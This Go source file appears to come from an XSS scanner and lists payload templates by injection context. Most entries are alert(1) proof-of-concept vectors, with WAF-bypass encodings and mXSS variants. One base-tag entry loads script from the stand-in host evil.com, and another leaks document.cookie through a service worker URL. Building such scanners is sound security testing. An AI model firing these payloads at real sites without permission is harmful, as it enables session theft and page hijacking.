package payload

import (
	"github.com/xsscan/xsscan/pkg/context"
	"github.com/xsscan/xsscan/pkg/model"
)

type PayloadTemplate struct {
	Value        string
	Context      context.ContextType
	Severity     model.Severity
	Desc     string
	WAFBypassOnly bool // true = only used when --waf-bypass is enabled
}

var payloadTemplates = map[context.ContextType][]PayloadTemplate{
	context.ContextHTMLBody: {
		// Polyglot payload (works across html/attr/js breakout contexts via angle brackets)
		{Value: `javascript:/*--></title></textarea></style></script></xmp><svg/onload=alert(1)>`, Severity: model.Critical, Desc: "Polyglot: html/attr/js breakout"},
		// Standard HTML body payloads
		{Value: `<script>alert(1)</script>`, Severity: model.High, Desc: "Basic script injection"},
		{Value: `<img src=x onerror=alert(1)>`, Severity: model.High, Desc: "Image onerror"},
		{Value: `<img/src=x/onerror=alert(1)>`, Severity: model.High, Desc: "Image onerror (slash bypass)"},
		{Value: `<svg onload=alert(1)>`, Severity: model.High, Desc: "SVG onload"},
		{Value: `<svg/onload=alert(1)>`, Severity: model.High, Desc: "SVG onload (slash bypass)"},
		{Value: `<svg><animate onbegin=alert(1) attributeName=x dur=1s>`, Severity: model.High, Desc: "SVG animate onbegin"},
		{Value: `<svg><set onbegin=alert(1) attributename=x to=1>`, Severity: model.High, Desc: "SVG set onbegin"},
		{Value: `<svg><animateMotion onbegin=alert(1) dur=1s>`, Severity: model.High, Desc: "SVG animateMotion onbegin"},
		{Value: `<svg><animateTransform onbegin=alert(1) attributeName=transform type=scale>`, Severity: model.High, Desc: "SVG animateTransform onbegin"},
		{Value: `<svg><image href=1 onerror=alert(1)>`, Severity: model.High, Desc: "SVG image onerror"},
		{Value: `<iframe srcdoc="<script>alert(1)</script>">`, Severity: model.High, Desc: "Iframe srcdoc injection"},
		{Value: `<body onpageshow=alert(1)>`, Severity: model.High, Desc: "Body onpageshow"},
		{Value: `<body onpopstate=alert(1)>`, Severity: model.Medium, Desc: "Body onpopstate"},
		{Value: `<textarea autofocus onfocus=alert(1)>`, Severity: model.High, Desc: "Textarea autofocus"},
		{Value: `<math><mi><style><img src=x onerror=alert(1)></style></mi></math>`, Severity: model.High, Desc: "MathML mXSS via style breakout"},
		{Value: `<details open ontoggle=alert(1)>`, Severity: model.High, Desc: "Details ontoggle"},
		{Value: `<marquee onstart=alert(1)>`, Severity: model.Medium, Desc: "Marquee onstart"},
		{Value: `<body onload=alert(1)>`, Severity: model.High, Desc: "Body onload"},
		{Value: `<iframe src=javascript:alert(1)>`, Severity: model.High, Desc: "Iframe javascript URI"},
		{Value: `<a href="javascript:alert(1)">click</a>`, Severity: model.Medium, Desc: "Anchor javascript URI"},
		{Value: `<input onfocus=alert(1) autofocus>`, Severity: model.High, Desc: "Input autofocus"},
		{Value: `<video><source onerror="alert(1)">`, Severity: model.High, Desc: "Video source error"},
		{Value: `<audio src=x onerror=alert(1)>`, Severity: model.High, Desc: "Audio source error"},
		{Value: `<object data="javascript:alert(1)">`, Severity: model.Medium, Desc: "Object data URI"},
		{Value: `<embed src="javascript:alert(1)">`, Severity: model.Medium, Desc: "Embed javascript URI"},
		{Value: `<form><button formaction=javascript:alert(1)>`, Severity: model.Medium, Desc: "Form action bypass"},
		// WAF bypass variants
		{Value: `<img	src=x	onerror=alert(1)>`, Severity: model.High, Desc: "Tab-separated attrs", WAFBypassOnly: true},
		{Value: `<svg	onload=alert(1)>`, Severity: model.High, Desc: "Tab-separated SVG", WAFBypassOnly: true},
		{Value: "<img/src=x/onerror=alert`1`>", Severity: model.High, Desc: "Backtick fn call (no parens)", WAFBypassOnly: true},
		{Value: `<img src=x onerror=confirm(1)>`, Severity: model.High, Desc: "confirm() when alert blocked"},
		{Value: `<img src=x onerror=prompt(1)>`, Severity: model.High, Desc: "prompt() when alert blocked"},
		// Short payloads for length-limited inputs
		{Value: `<script src=//xx.js>`, Severity: model.High, Desc: "Short script include"},
		// DOM clobbering
		{Value: `<img name=body onerror=alert(1)>`, Severity: model.High, Desc: "DOM clobber document.body"},
		{Value: `<form name=document><output name=location></form>`, Severity: model.High, Desc: "DOM clobber nested"},
		// Breakout prefixes for nested contexts
		{Value: `</title><svg onload=alert(1)>`, Severity: model.High, Desc: "Breakout from title"},
		{Value: `</textarea><svg onload=alert(1)>`, Severity: model.High, Desc: "Breakout from textarea"},
		{Value: `</style><svg onload=alert(1)>`, Severity: model.High, Desc: "Breakout from style"},
		// Mutation XSS (mXSS) — payloads that mutate when browser parses them
		{Value: `<svg><style><img src=x onerror=alert(1)></style></svg>`, Severity: model.High, Desc: "mXSS via style in SVG namespace"},
		{Value: `<svg><noscript><img src=x onerror=alert(1)></noscript></svg>`, Severity: model.High, Desc: "mXSS via noscript in SVG"},
		{Value: `<svg><foreignObject><img src=x onerror=alert(1)></foreignObject></svg>`, Severity: model.High, Desc: "mXSS via foreignObject breakout"},
		// Advanced SVG event handlers
		{Value: `<svg><a><animate onbegin=alert(1) attributeName=x dur=1s>`, Severity: model.High, Desc: "SVG animate via <a> element"},
		{Value: `<svg onload="setTimeout`+`alert(1)">`, Severity: model.High, Desc: "SVG onload setTimeout"},
		// Base tag hijacking
		{Value: `<base href="//evil.com/"><script src="/cdn.js"></script>`, Severity: model.High, Desc: "Base tag CDN hijack"},
		// Service Worker injection (stored XSS vector)
		{Value: `<script>navigator.serviceWorker.register('/sw.js?x='+document.cookie)</script>`, Severity: model.Medium, Desc: "Service worker registration"},
		// DOM sink payloads
		{Value: `<img src=x onerror="document.write('<script>alert(1)</script>')">`, Severity: model.High, Desc: "document.write DOM sink"},
		{Value: `<img src=x onerror="document.body.innerHTML+='<img src=x onerror=alert(1)>'">`, Severity: model.High, Desc: "innerHTML DOM sink"},
		// HTML5 vectors
		{Value: `<math><mtext><table><mglyph><style><img src=x onerror=alert(1)></style></mglyph>`, Severity: model.High, Desc: "MathML mglyph mXSS"},
		{Value: `<math><annotation-xml encoding="text/html"><img src=x onerror=alert(1)></annotation-xml></math>`, Severity: model.High, Desc: "MathML annotation-xml breakout"},
		{Value: `<video autoplay onloadstart="alert(1)"><source src="x">`, Severity: model.Medium, Desc: "Video loadstart"},
		{Value: `<link rel=import href="data:text/html,<script>alert(1)</script>">`, Severity: model.Medium, Desc: "HTML import (Chrome)"},
		// Trusted Types bypass (when default policy is misconfigured)
		{Value: `<script>trustedTypes.createPolicy('default',{createHTML:s=>s});document.body.innerHTML='<img src=x onerror=alert(1)>'</script>`, Severity: model.High, Desc: "Trusted Types default policy escape"},
		// SVG <use> with data: URI
		{Value: `<svg><use href="data:image/svg+xml,<svg id='x' xmlns='http://www.w3.org/2000/svg'><image href='x' onerror='alert(1)'/></svg>#x"></use></svg>`, Severity: model.High, Desc: "SVG use data: URI injection"},
		// <meta> refresh XSS
		{Value: `<meta http-equiv=refresh content="0;url=javascript:alert(1)">`, Severity: model.Medium, Desc: "Meta refresh javascript URI"},
		// <svg><discard> event handler
		{Value: `<svg><discard onbegin=alert(1)></svg>`, Severity: model.High, Desc: "SVG discard onbegin"},
		// <svg> nested onload
		{Value: `<svg><svg onload=alert(1)>`, Severity: model.High, Desc: "Nested SVG onload"},
		// Custom element with event handler
		{Value: `<x-xsr onload=alert(1)>`, Severity: model.High, Desc: "Custom element event handler"},
	},
	context.ContextHTMLAttrValue: {
		// Quote breakout + event handler
		{Value: `" onfocus="alert(1)" autofocus="`, Severity: model.High, Desc: "Double quote breakout + onfocus"},
		{Value: `' onmouseover='alert(1)' style='display:block;width:100vw;height:100vh`, Severity: model.High, Desc: "Single quote breakout + onmouseover"},
		{Value: `" onmouseover="alert(1)" style="position:fixed;top:0;left:0;width:100%;height:100%"`, Severity: model.High, Desc: "Mouseover hijack"},
		{Value: `"><script>alert(1)</script>`, Severity: model.High, Desc: "Tag breakout + script"},
		{Value: `' onfocus=alert(1) autofocus='`, Severity: model.High, Desc: "Attribute breakout single quote"},
		{Value: `" style="background:url(javascript:alert(1))`, Severity: model.Medium, Desc: "Style injection"},
		// Quote breakout + event handler
		{Value: `"><body onload=alert(1)>`, Severity: model.High, Desc: "Tag breakout + body onload"},
		// Non-event-handler payloads: bypass on* filters (e.g., onload→o_nload)
		{Value: `"><svg><script>alert(1)</script>`, Severity: model.High, Desc: "Tag breakout + SVG script (no event handler)"},
		{Value: `"><iframe srcdoc="<script>alert(1)</script>">`, Severity: model.High, Desc: "Tag breakout + iframe srcdoc"},
		{Value: `"><a href=javascript:alert(1)>XSS</a>`, Severity: model.Medium, Desc: "Tag breakout + javascript link"},
		{Value: `"><form action=javascript:alert(1)><button>X</button></form>`, Severity: model.Medium, Desc: "Tag breakout + form action"},
		{Value: `"><math><annotation-xml encoding="text/html"><script>alert(1)</script></annotation-xml></math>`, Severity: model.High, Desc: "Tag breakout + MathML script"},
	},
	context.ContextURLAttr: {
		{Value: `javascript:alert(1)`, Severity: model.High, Desc: "javascript: URI"},
		{Value: `data:text/html,<script>alert(1)</script>`, Severity: model.High, Desc: "data: URI HTML"},
		{Value: `data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==`, Severity: model.High, Desc: "data: URI base64"},
		{Value: `vbscript:MsgBox(1)`, Severity: model.Low, Desc: "VBScript URI (IE)"},
		// Encoded javascript: URI (bypass WAF that blocks literal "javascript:")
		{Value: `java&#x09;script:alert(1)`, Severity: model.High, Desc: "Tab-encoded javascript URI"},
		{Value: `java&#x0A;script:alert(1)`, Severity: model.High, Desc: "Newline-encoded javascript URI"},
		{Value: `&#106;avascript:alert(1)`, Severity: model.High, Desc: "Entity-encoded javascript URI"},
		{Value: `data:image/svg+xml,<svg onload=alert(1)></svg>`, Severity: model.High, Desc: "SVG in data: URI (auto-executes)"},
	},
	context.ContextJSString: {
		{Value: `';alert(1)//`, Severity: model.High, Desc: "Single quote breakout"},
		{Value: `"-alert(1)-"`, Severity: model.High, Desc: "Double quote template literal"},
		{Value: `\\';alert(1)//`, Severity: model.High, Desc: "Escaped quote breakout"},
		{Value: `${alert(1)}`, Severity: model.High, Desc: "Template literal injection"},
		{Value: `';eval('alert(1)')//`, Severity: model.High, Desc: "Eval via string breakout"},
		{Value: `</script><script>alert(1)</script>`, Severity: model.High, Desc: "Script tag breakout"},
		// DOM sinks via JS breakout
		{Value: `';document.write('<script>alert(1)</script>')//`, Severity: model.High, Desc: "document.write via string breakout"},
		{Value: `';location='javascript:alert(1)'//`, Severity: model.High, Desc: "Location JS URI via breakout"},
		{Value: `';Function('alert(1)')()//`, Severity: model.High, Desc: "Function constructor via breakout"},
		{Value: `';import('data:text/javascript,alert(1)')//`, Severity: model.High, Desc: "Dynamic import data URI"},
		// Alternative JS execution sinks (WAF bypass when alert is blocked)
		{Value: "';setTimeout`alert(1)`//", Severity: model.High, Desc: "setTimeout backtick call"},
		{Value: "';Function`alert(1)``//", Severity: model.High, Desc: "Function constructor backtick"},
		{Value: "';location=`javascript:alert(1)`//", Severity: model.High, Desc: "Location JS URI assignment"},
		{Value: "';location.assign`javascript:alert(1)`//", Severity: model.High, Desc: "Location.assign backtick"},
	},
	context.ContextJSTemplateLiteral: {
		{Value: `${alert(1)}`, Severity: model.High, Desc: "Template literal expression execution"},
		{Value: `${prompt(1)}`, Severity: model.High, Desc: "Template literal prompt"},
		{Value: `${confirm(1)}`, Severity: model.High, Desc: "Template literal confirm"},
		{Value: `${Function('alert(1)')()}`, Severity: model.Critical, Desc: "Template literal Function exec"},
		{Value: `${eval('alert(1)')}`, Severity: model.Critical, Desc: "Template literal eval"},
		{Value: `</script><script>alert(1)</script>`, Severity: model.Critical, Desc: "Script breakout"},
	},
	context.ContextJSBlock: {
		{Value: `alert(1)`, Severity: model.Critical, Desc: "Direct JS execution"},
		{Value: `eval('alert(1)')`, Severity: model.Critical, Desc: "Eval direct"},
		{Value: `Function('alert(1)')()`, Severity: model.Critical, Desc: "Function constructor"},
	},
	context.ContextTemplate: {
		{Value: `{{constructor.constructor('alert(1)')()}}`, Severity: model.High, Desc: "Vue constructor escape"},
		{Value: `{{_c.constructor('alert(1)')()}}`, Severity: model.High, Desc: "Vue _c escape"},
		{Value: `[[constructor.constructor('alert(1)')()]]`, Severity: model.High, Desc: "Angular sandbox escape"},
	},
	context.ContextHTMLComment: {
		{Value: `--><script>alert(1)</script><!--`, Severity: model.Medium, Desc: "Comment breakout"},
		{Value: `--><img src=x onerror=alert(1)>`, Severity: model.Medium, Desc: "Comment breakout + img"},
	},
	context.ContextHTMLTag: {
		{Value: `svg onload=alert(1)`, Severity: model.High, Desc: "Tag name injection → new tag with attrs"},
		{Value: `img src=x onerror=alert(1)`, Severity: model.High, Desc: "Tag name injection → img"},
		{Value: `script>alert(1)</script`, Severity: model.Critical, Desc: "Tag name → script"},
	},
	context.ContextHTMLAttrName: {
		{Value: `onfocus=alert(1) autofocus=`, Severity: model.High, Desc: "Attr name injection"},
		{Value: `onload=alert(1)`, Severity: model.High, Desc: "Attr name → event handler"},
	},
	context.ContextCSSBlock: {
		{Value: `</style><script>alert(1)</script>`, Severity: model.High, Desc: "Style breakout to script"},
		{Value: `</style><svg onload=alert(1)>`, Severity: model.High, Desc: "Style breakout to svg"},
		{Value: `body{background:url(javascript:alert(1))}`, Severity: model.Medium, Desc: "CSS background url (IE)"},
		{Value: `@import url(javascript:alert(1));`, Severity: model.Medium, Desc: "CSS import javascript (IE)"},
		{Value: `}</style><svg onload=alert(1)>`, Severity: model.High, Desc: "Style close + breakout"},
	},
	context.ContextCSSValue: {
		{Value: `expression(alert(1))`, Severity: model.Medium, Desc: "CSS expression (IE)"},
		{Value: `</style><script>alert(1)</script>`, Severity: model.Medium, Desc: "Style tag breakout"},
	},
	context.ContextJSONValue: {
		// JSON string breakout — close the string, inject HTML breakout
		{Value: `</title><script>alert(1)</script>`, Severity: model.High, Desc: "JSON string breakout to HTML"},
		{Value: `</textarea><script>alert(1)</script>`, Severity: model.High, Desc: "JSON breakout via textarea close"},
		{Value: `</div><img src=x onerror=alert(1)>`, Severity: model.High, Desc: "JSON breakout to img onerror"},
		// JSON-specific: break out of JSON string with backslash escaping
		{Value: `\"-alert(1)//`, Severity: model.Medium, Desc: "JSON string escape + JS injection"},
		{Value: `\"+alert(1)+\"`, Severity: model.Medium, Desc: "JSON string concat breakout"},
		{Value: `\"},alert(1),{\"x\":\"`, Severity: model.High, Desc: "JSON object breakout"},
		// JSONP callback injection
		{Value: `;alert(1)//`, Severity: model.Medium, Desc: "JSONP callback injection"},
		{Value: `*/alert(1)/*`, Severity: model.Medium, Desc: "JSON comment injection"},
	},
}

func init() {
	// Pre-merge extended wordlist into the core map once at startup.
	// A defensive copy avoids mutating the shared backing array if
	// any composite-literal slice later gains spare capacity.
	for ctxType, ext := range extendedPayloads {
		if core, ok := payloadTemplates[ctxType]; ok {
			merged := make([]PayloadTemplate, 0, len(core)+len(ext))
			merged = append(merged, core...)
			merged = append(merged, ext...)
			payloadTemplates[ctxType] = merged
		}
	}
}

func GetTemplates(ctxType context.ContextType) []PayloadTemplate {
	return payloadTemplates[ctxType]
}
